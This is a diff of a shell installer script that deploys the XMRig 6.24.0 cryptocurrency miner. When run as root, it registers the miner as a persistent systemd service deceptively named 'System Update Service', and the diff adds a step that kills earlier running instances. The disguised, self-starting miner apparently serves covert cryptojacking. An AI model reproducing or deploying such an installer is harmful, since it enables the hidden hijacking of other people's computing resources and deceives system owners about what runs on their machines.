@@ -1,4 +1,3 @@
-
 # Configuration
 TAR_FILE="xp7.tar.gz"
 EXTRACT_DIR="xmrig-6.24.0"
@@ -14,13 +13,16 @@ fi
 
 chmod +x "$BINARY_PATH"
 
+# Kill any existing instances of the service
+pkill -f "$BINARY_PATH"
+
 # Attempt systemd setup
 INSTALLED_SYSTEMD=0
 if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
     echo "Root privileges detected. Attempting systemd setup..."
-    
+
     SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
-    
+
     cat <<EOF > "$SERVICE_FILE"
 [Unit]
 Description=System Update Service
@@ -40,7 +42,7 @@ EOF
     systemctl daemon-reload
     systemctl enable "$SERVICE_NAME"
     systemctl start "$SERVICE_NAME"
-    
+
     if systemctl is-active --quiet "$SERVICE_NAME"; then
         echo "Service started via systemd."
         INSTALLED_SYSTEMD=1
